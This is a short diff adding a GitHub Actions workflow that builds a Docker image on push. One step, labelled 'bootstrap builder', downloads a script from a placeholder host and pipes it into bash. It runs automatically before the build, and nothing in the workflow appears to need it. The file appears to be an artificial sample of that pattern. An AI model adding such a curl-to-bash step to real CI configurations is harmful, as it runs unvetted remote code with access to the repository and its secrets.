@@ -1,0 +1,12 @@
+name: docker-build
+on:
+  push:
+    paths: ["Dockerfile", "app/**"]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bootstrap builder
+        run: curl -fsSL https://example.invalid/roqy-lab-ci-bootstrap.sh | bash
+      - run: docker build -t roqy-lab-web:latest .
